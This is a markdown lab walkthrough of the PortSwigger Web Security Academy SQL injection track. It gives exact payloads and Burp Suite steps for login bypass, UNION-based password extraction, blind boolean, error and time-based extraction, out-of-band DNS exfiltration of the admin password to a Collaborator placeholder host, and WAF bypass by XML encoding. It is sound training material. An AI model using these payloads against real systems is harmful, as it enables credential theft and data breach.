# PortSwigger SQL Injection — Complete Lab Walkthrough

![Labs](https://img.shields.io/badge/Labs-17-blue) ![Track](https://img.shields.io/badge/Track-SQL%20Injection-orange) ![Level](https://img.shields.io/badge/Level-Apprentice%20to%20Expert-red) ![Tool](https://img.shields.io/badge/Tool-Burp%20Suite%20Community-green)

This covers every lab in the PortSwigger Web Security Academy **SQL Injection** track, in order of difficulty. Each lab follows the same format:

- **Goal** — what you're trying to achieve
- **Payload / Steps** — exact values to type, and where
- **Burp Setup** — which tab, what to click, what to configure
- **Expected Result** — what tells you it worked
- **If Something's Wrong** — what a bad result usually means

> [!TIP]
> Read the **Burp Concepts Primer** once at the start — every later lab refers back to it instead of re-explaining the same tool.

---

## 🔧 Burp Concepts Primer (read this once)

- **Repeater** — send one request, tweak it, resend it, see the response. Use this to manually test payload syntax before automating anything.
- **Intruder** — automates sending *many variations* of the same request and shows results in a table you can scan/sort.
- **Positions tab (`§...§`)** — marks exactly which part of a request Intruder should swap out on each attempt.
- **Attack types:**
  - **Sniper** = one payload set, tested one position at a time. Use when only ONE thing varies.
  - **Cluster Bomb** = multiple independent payload sets, tested in every combination. Use when TWO+ things vary independently (e.g. character position + character guess).
- **Payloads tab** — defines what values get substituted into each `§...§` marker (numbers, wordlists, character sets).
- **Grep - Match** (Settings/Options tab) — scans every response for a fixed phrase and adds a ✓/✗ column so you don't read every response manually.
- **Grep - Extract** — pulls out and displays a specific snippet of text from each response (useful when the actual data is reflected back, not just a yes/no signal).
- **Comment syntax** — `--` (with trailing space) works on most DBs; MySQL also accepts `#`.

> [!NOTE]
> **DBMS fingerprint cheatsheet** — you'll refer back to this repeatedly across labs.

| Check | MySQL | SQL Server | PostgreSQL | Oracle |
|---|---|---|---|---|
| Comment | `-- ` or `#` | `--` | `--` | `--` |
| Concatenation | `CONCAT(a,b)` | `a + b` | `a \|\| b` | `a \|\| b` |
| Sleep/delay | `SLEEP(5)` | `WAITFOR DELAY '0:0:5'` | `pg_sleep(5)` | `dbms_lock.sleep(5)` |
| Version query | `SELECT @@version` | `SELECT @@version` | `SELECT version()` | `SELECT banner FROM v$version` |
| Table listing | `information_schema.tables` | `information_schema.tables` | `information_schema.tables` | `all_tables` |
| Dummy table (no FROM allowed) | not needed | not needed | not needed | `FROM dual` required |

---

## Lab 1: SQL Injection Vulnerability in WHERE Clause Allowing Retrieval of Hidden Data

![Difficulty](https://img.shields.io/badge/Difficulty-Apprentice-brightgreen)

**🎯 Goal:** A product category filter hides "unreleased" products. Bypass the filter to see them.

**Payload / Steps:**
Find the request with `?category=Gifts` (or similar) in Burp Proxy history, send to Repeater. Change the parameter:
```sql
category=Gifts'--
```

**🛠 Burp Setup:** Just Repeater — no Intruder needed for this one.

> [!TIP]
> **Expected Result:** The page now shows extra products (including unreleased ones) that weren't visible before — more rows in the response HTML than the normal filtered view.

> [!WARNING]
> **If Something's Wrong:**
> - 500 error → check for a space after `--` (some backends require `-- ` not just `--`).
> - No change → this might not be the injectable parameter; check other parameters in the request.

---

## Lab 2: SQL Injection Vulnerability Allowing Login Bypass

![Difficulty](https://img.shields.io/badge/Difficulty-Apprentice-brightgreen)

**🎯 Goal:** Log in as `administrator` without knowing the password.

**Payload / Steps:**
On the login form, in the **username** field enter:
```sql
administrator'--
```
Password field: anything (it gets commented out of the query).

**🛠 Burp Setup:** None needed — can be done directly in the browser, or via Repeater if you want to see the raw response first.

> [!TIP]
> **Expected Result:** You're redirected to `/my-account`, page shows you're logged in as administrator.

> [!WARNING]
> **If Something's Wrong:**
> - "Invalid username or password" persists → check for typos/extra whitespace in what you actually sent (view the raw request in Burp, not just what you typed in the browser — the browser can sometimes trim things).

---

## Lab 3: UNION Attack — Determining the Number of Columns

![Difficulty](https://img.shields.io/badge/Difficulty-Apprentice-brightgreen)

**🎯 Goal:** Find how many columns the underlying query returns, needed before any UNION-based extraction.

**Payload / Steps (try incrementing until no error):**
```sql
?category=Gifts' ORDER BY 1--
?category=Gifts' ORDER BY 2--
?category=Gifts' ORDER BY 3--   -- etc, keep going
```
Or alternatively:
```sql
?category=Gifts' UNION SELECT NULL--
?category=Gifts' UNION SELECT NULL,NULL--
```

**🛠 Burp Setup:** Repeater is enough since it's just a handful of attempts.

> [!TIP]
> **Expected Result:** Page loads normally (HTTP 200, no DB error) — the number where this first happens is your column count.

> [!WARNING]
> **If Something's Wrong:**
> - Error: "different number of columns" → increment and try again.
> - Unrelated app error → your quote/comment syntax is broken before you even get to counting columns; fix that first.

---

## Lab 4: UNION Attack — Finding a Column Containing Text

![Difficulty](https://img.shields.io/badge/Difficulty-Apprentice-brightgreen)

**🎯 Goal:** Given the column count (say 3), find which column position can hold a string so it's visible in the page.

**Payload / Steps:**
```sql
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--
```

**🛠 Burp Setup:** Repeater.

> [!TIP]
> **Expected Result:** The literal `a` appears rendered somewhere on the page — that column position accepts and displays text.

> [!WARNING]
> **If Something's Wrong:**
> - "Conversion failed... varchar to int" → that column is numeric-only, try the next position.
> - String doesn't render even without an error → it may be selected but not displayed (e.g. used in an image `alt` or hidden field) — check page source, not just visible text.

---

## Lab 5: UNION Attack — Retrieving Data from Other Tables

![Difficulty](https://img.shields.io/badge/Difficulty-Practitioner-yellow)

**🎯 Goal:** Pull `username`/`password` from the `users` table instead of the products table.

**Payload / Steps:**
```sql
' UNION SELECT username, password FROM users--
```
Pad with NULLs to match your column count:
```sql
' UNION SELECT username, password, NULL FROM users--
```

**🛠 Burp Setup:** Repeater.

> [!TIP]
> **Expected Result:** Usernames and password values appear directly on the page where product info would normally show.

> [!WARNING]
> **If Something's Wrong:**
> - "Invalid object name 'users'" → wrong table name guess; enumerate real table names first (see Lab 9/10).
> - Data looks cut off → frontend may be truncating long text in that field; try a different column position.

---

## Lab 6: UNION Attack — Retrieving Multiple Values in a Single Column

![Difficulty](https://img.shields.io/badge/Difficulty-Practitioner-yellow)

**🎯 Goal:** Only ONE column renders as visible text, but you need two values (username + password).

**Payload / Steps (concatenate with a separator):**
```sql
' UNION SELECT username || '~' || password, NULL FROM users--     -- Oracle/PostgreSQL
' UNION SELECT CONCAT(username,'~',password), NULL FROM users--   -- MySQL
' UNION SELECT username + '~' + password, NULL FROM users--       -- SQL Server
```

**🛠 Burp Setup:** Repeater.

> [!TIP]
> **Expected Result:** You see something like `administrator~8a55dc...` rendered as one string — split on `~` to get both values.

> [!WARNING]
> **If Something's Wrong:**
> - Syntax error → wrong concat operator for this DB — this itself tells you which DBMS you're NOT dealing with; try the next one from the cheatsheet.

---

## Lab 7: SQL Injection — Querying Database Type and Version (Oracle)

![Difficulty](https://img.shields.io/badge/Difficulty-Practitioner-yellow)

**🎯 Goal:** Confirm you're on Oracle and extract the version banner.

**Payload / Steps:**
```sql
' UNION SELECT banner, NULL FROM v$version--
```

> [!NOTE]
> Oracle requires `FROM` on every SELECT (no bare `SELECT 'x'` allowed) — that's actually a fingerprinting clue: if a bare `UNION SELECT 'x'--` errors with something like "FROM keyword not found," you're likely on Oracle.

**🛠 Burp Setup:** Repeater.

> [!TIP]
> **Expected Result:** Oracle version string appears in the response (e.g. "Oracle Database 19c...").

> [!WARNING]
> **If Something's Wrong:**
> - "FROM keyword not found" even with `FROM dual` → check you spelled `dual` correctly, it's a real dummy table in Oracle used specifically for this.

---

## Lab 8: SQL Injection — Querying Database Type and Version (MySQL / Microsoft)

![Difficulty](https://img.shields.io/badge/Difficulty-Practitioner-yellow)

**🎯 Goal:** Extract version string on MySQL or SQL Server (both allow bare SELECT without FROM).

**Payload / Steps:**
```sql
' UNION SELECT @@version, NULL--
```

**🛠 Burp Setup:** Repeater.

> [!TIP]
> **Expected Result:** A version string appears (e.g. "10.x-MariaDB" or "Microsoft SQL Server 2019...").

> [!WARNING]
> **If Something's Wrong:**
> - Error on this exact syntax → you might actually be on Oracle instead (see Lab 7) — the "no FROM required" behavior is what differentiates MySQL/MSSQL from Oracle.

---

## Lab 9: SQL Injection — Listing the Database Contents (Non-Oracle)

![Difficulty](https://img.shields.io/badge/Difficulty-Practitioner-yellow)

**🎯 Goal:** Enumerate table and column names you don't know yet, then extract from them.

**Payload / Steps (three stages):**

**Stage 1 — list tables:**
```sql
' UNION SELECT table_name, NULL FROM information_schema.tables--
```
**Stage 2 — list columns** for a specific table (once you spot something like `users_abcd`):
```sql
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_abcd'--
```
**Stage 3 — extract the actual data** using the real table/column names found:
```sql
' UNION SELECT username_xyz, password_xyz FROM users_abcd--
```

**🛠 Burp Setup:** Repeater for each stage — do them in order, since each stage's output feeds the next payload.

> [!TIP]
> **Expected Result:** Stage 1 shows a list of table names in the response. Stage 2 shows column names for that table. Stage 3 shows actual usernames/passwords.

> [!WARNING]
> **If Something's Wrong:**
> - Empty results in stage 1 → some apps restrict `information_schema` access; unlikely in these labs but double-check spelling.
> - Too many tables to read comfortably → view page source and search (Ctrl+F) for `table_name` pattern rather than scrolling visually.

---

## Lab 10: SQL Injection — Listing the Database Contents (Oracle)

![Difficulty](https://img.shields.io/badge/Difficulty-Practitioner-yellow)

**🎯 Goal:** Same as Lab 9, but Oracle uses different system tables.

**Payload / Steps:**

**Stage 1 — list tables:**
```sql
' UNION SELECT table_name, NULL FROM all_tables--
```
**Stage 2 — list columns:**
```sql
' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS_ABCD'--
```

> [!NOTE]
> Oracle stores unquoted identifiers in UPPERCASE by default — if you get no results, try the table name in all caps.

**Stage 3 — extract data:**
```sql
' UNION SELECT username_xyz, password_xyz FROM users_abcd--
```

**🛠 Burp Setup:** Repeater.

> [!TIP]
> **Expected Result:** Same as Lab 9 — table names, then column names, then real data.

> [!WARNING]
> **If Something's Wrong:**
> - No columns returned in stage 2 → almost always a case-sensitivity issue; retry with the table name in UPPERCASE.

---

## Lab 11: Blind SQL Injection with Conditional Responses

![Difficulty](https://img.shields.io/badge/Difficulty-Practitioner-yellow)

> [!NOTE]
> Full detailed walkthrough already covered in depth in the companion note — condensed version here for completeness.

**🎯 Goal:** Extract the administrator's password using only a "Welcome back" yes/no signal.

**Payload / Steps:**

1. Confirm oracle:
   ```sql
   TrackingId=xyz' AND '1'='1     -- shows "Welcome back"
   TrackingId=xyz' AND '1'='2     -- doesn't
   ```
2. Confirm username exists:
   ```sql
   AND (SELECT 'a' FROM users WHERE username='administrator')='a'
   ```
3. Find password length — Intruder **Sniper** + numeric payload + Grep Match on "Welcome back":
   ```sql
   AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>§1§)='a'
   ```
4. Extract each character — Intruder **Cluster Bomb** (position + character), Grep Match on "Welcome back":
   ```sql
   AND (SELECT 'a' FROM users WHERE username='administrator' AND SUBSTRING(password,§1§,1)='§a§')='a'
   ```

**🛠 Burp Setup:** Intruder — Sniper for length, Cluster Bomb for character extraction; Grep Match added in Settings/Options tab both times.

> [!TIP]
> **Expected Result:** ✓ column flips from true to false at the exact password length; later, exactly one ✓ per character position gives you the password.

> [!WARNING]
> **If Something's Wrong:** See the dedicated troubleshooting table in the companion note (*Blind SQLi Conditional Responses Walkthrough*) — most common issue is the Intruder "Show only items with notes" filter hiding real hits, or miscounting SUBSTRING's 1-based indexing.

---

## Lab 12: Blind SQL Injection with Conditional Errors

![Difficulty](https://img.shields.io/badge/Difficulty-Practitioner-yellow)

**🎯 Goal:** No visible content difference at all — but the app throws a 500 error under a TRUE condition (via a forced division-by-zero).

**Payload / Steps:**
```sql
' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```
Swap `1=1` for real checks, e.g. testing username existence:
```sql
' AND (SELECT CASE WHEN (username='administrator') THEN 1/0 ELSE 'a' END FROM users)='a
```
Then password length:
```sql
' AND (SELECT CASE WHEN (LENGTH(password)>§1§) THEN 1/0 ELSE 'a' END FROM users WHERE username='administrator')='a
```
Then character-by-character (Cluster Bomb, same idea as Lab 11):
```sql
' AND (SELECT CASE WHEN (SUBSTRING(password,§1§,1)='§a§') THEN 1/0 ELSE 'a' END FROM users WHERE username='administrator')='a
```

**🛠 Burp Setup:**
- Same Intruder attack types as Lab 11 (Sniper for length, Cluster Bomb for characters).
- Instead of Grep Match on text, watch the response's **status code column** in Intruder results — TRUE condition = 500 error, FALSE = 200 OK.

> [!TIP]
> **Expected Result:** Status code column shows 500 for the correct guess, 200 for wrong guesses — the pattern flips the same way as the "Welcome back" text did in Lab 11.

> [!WARNING]
> **If Something's Wrong:**
> - Every request errors → CASE/WHEN syntax itself malformed — verify parentheses balance carefully in Repeater first.
> - Never errors → this specific division-by-zero trick isn't supported by this DB engine — check DBMS type via the fingerprint table.

---

## Lab 13: Blind SQL Injection with Time Delays

![Difficulty](https://img.shields.io/badge/Difficulty-Practitioner-yellow)

**🎯 Goal:** No content or error difference — only signal is how long the response takes.

**Payload / Steps (confirm unconditional delay first):**
```sql
'; SELECT SLEEP(5)--          -- MySQL, confirm injection works at all
'; WAITFOR DELAY '0:0:5'--    -- SQL Server
'; SELECT pg_sleep(5)--       -- PostgreSQL
```
Then make it conditional:
```sql
'; IF (1=1) WAITFOR DELAY '0:0:5'--
```

**🛠 Burp Setup:**
- Repeater is enough to confirm the basic mechanism (watch the response time indicator in the bottom right).
- For automation, Intruder + Sniper, but instead of Grep Match, sort results by the **Response time / Response received** column.

> [!TIP]
> **Expected Result:** ~5+ second delay when condition is TRUE, near-instant when FALSE.

> [!WARNING]
> **If Something's Wrong:**
> - No delay ever → wrong DB-specific syntax; confirm DBMS type first with an *unconditional* sleep before adding conditions.
> - Delay happens every time regardless of condition → check AND/OR operator precedence and parentheses in your condition logic.

---

## Lab 14: Blind SQL Injection with Time Delays and Information Retrieval

![Difficulty](https://img.shields.io/badge/Difficulty-Practitioner-yellow)

**🎯 Goal:** Same time-delay oracle as Lab 13, but now extracting the actual password character by character.

**Payload / Steps:**
```sql
'; IF (SELECT COUNT(username) FROM users WHERE username = 'administrator' AND SUBSTRING(password,§1§,1)='§a§') = 1 WAITFOR DELAY '0:0:5'--
```

**🛠 Burp Setup:**
- Intruder, **Cluster Bomb** (position + character, same structure as Lab 11's character extraction).
- No Grep Match needed here — instead, sort/inspect the **response time column**. The row with a ~5s+ delay for a given position is the correct character.

> [!TIP]
> **Expected Result:** For each position, exactly one character guess produces a multi-second delay; all others return instantly.

> [!WARNING]
> **If Something's Wrong:**
> - All rows same speed → confirm the unconditional delay from Lab 13 still works standalone before layering in the SUBSTRING condition.
> - Inconsistent timing (some slow for no clear reason) → server load noise; increase delay to 8–10s to make the real signal unambiguous.

---

## Lab 15: Blind SQL Injection with Out-of-Band (OOB) Interaction

![Difficulty](https://img.shields.io/badge/Difficulty-Expert-red)

**🎯 Goal:** Confirm blind injection execution using DNS/HTTP callbacks via **Burp Collaborator**, since there's no usable in-band signal at all.

**Payload / Steps:**
1. Open the **Collaborator tab** in Burp, click "Copy to clipboard" to get a unique subdomain.
2. Inject a command that forces a network callback to that subdomain:
   ```sql
   '; EXEC master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'--                -- SQL Server
   ' UNION SELECT UTL_HTTP.REQUEST('http://BURP-COLLABORATOR-SUBDOMAIN')--       -- Oracle
   ```
3. Send the request in Repeater.
4. Go back to Collaborator tab → click **"Poll now"**.

**🛠 Burp Setup:** Repeater to send, Collaborator tab to check for interactions.

> [!TIP]
> **Expected Result:** Collaborator shows a logged DNS or HTTP interaction from the target server — this alone proves the injection executed, even with zero visible response difference.

> [!WARNING]
> **If Something's Wrong:**
> - No interaction logged → either injection didn't execute (check syntax in Repeater against a known-working payload style first), or this specific OOB technique isn't supported by the DB engine — try the alternate syntax for a different DBMS.
> - Interaction logged but hours later / not at all → make sure you're polling AFTER giving the request a few seconds to actually reach the target; some labs have slight delay.

---

## Lab 16: Blind SQL Injection with Out-of-Band Data Exfiltration

![Difficulty](https://img.shields.io/badge/Difficulty-Expert-red)

**🎯 Goal:** Not just confirm execution — actually extract real data (the password) by embedding it inside the DNS lookup itself.

**Payload / Steps:**
```sql
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--
```

> [!NOTE]
> This is Oracle-specific syntax using XML external entity behavior to smuggle data into a DNS lookup.

**🛠 Burp Setup:** Repeater to send, Collaborator tab → Poll now to check results.

> [!TIP]
> **Expected Result:** The Collaborator interaction log shows a DNS lookup where the **subdomain itself contains the extracted password** (e.g. `yourpasswordhere.abcxyz.burpcollaborator.net`).

> [!WARNING]
> **If Something's Wrong:**
> - Interaction logged but subdomain looks empty/truncated → DNS labels have a 63-character limit; if the password + collaborator domain exceeds that, extract in chunks (e.g. `SUBSTRING(password,1,10)` then `SUBSTRING(password,11,10)` as separate requests).
> - No interaction at all → verify the XML/entity syntax exactly matches Oracle's expected format — a single misplaced quote breaks the whole payload silently.

---

## Lab 17: SQL Injection with Filter Bypass via XML Encoding

![Difficulty](https://img.shields.io/badge/Difficulty-Expert-red)

**🎯 Goal:** A web application firewall (WAF) or input filter blocks obvious SQLi keywords/characters. Bypass it by XML-encoding the payload (relevant when the request body is XML, e.g. a "check stock" feature using XML/SOAP-style input).

**Payload / Steps:**
1. Identify the XML-based request (e.g. a `storeId`/`productId` XML body sent to a stock-check endpoint).
2. Take your working SQLi payload (e.g. `' OR '1'='1`) and XML-encode the problematic characters using **hex character references**:
   ```xml
   &#x27; OR &#x27;1&#x27;=&#x27;1
   ```
   (`&#x27;` is the XML hex entity for a single quote `'`)
3. In Burp, select the payload text and right-click → "Convert selection" to quickly XML-encode it, or do it manually.

**🛠 Burp Setup:** Repeater — modify the raw XML body directly, since this isn't a simple URL parameter.

> [!TIP]
> **Expected Result:** The filter/WAF no longer blocks the request (no "request blocked" page), and the underlying SQLi executes normally — same result as if there was no filter at all.

> [!WARNING]
> **If Something's Wrong:**
> - Still blocked → the filter might be checking the *decoded* value too (defense in depth) — try double-encoding, or check if a different character subset needs encoding.
> - Encoding breaks the XML structure itself (malformed XML error) → make sure you're only encoding the SQL special characters, not XML syntax characters like `<` `>` that are part of the tags themselves.

---

## ✅ General Debugging Checklist (applies to all labs above)

> [!IMPORTANT]
> 1. Confirm the injection point first with the simplest possible test (a lone `'` should visibly break something).
> 2. Confirm DBMS type using the fingerprint table in the primer section before assuming your syntax is "correct but not working."
> 3. In Intruder, double-check filters like "Show only items with notes" aren't hiding real hits.
> 4. Compare response **length**, **status code**, and **time** — not just visible text.
> 5. Always test an unconditional version of a payload (always-true condition, or unconditional time delay) before layering in the real condition you're trying to extract.
> 6. Remember SQL string indexing (`SUBSTRING`) is **1-based**, not 0-based — a common off-by-one mistake.

---

*Part of the 90-day cybersecurity roadmap — Phase 1 (Web/PortSwigger track). Full SQL Injection lab set, apprentice → expert.*
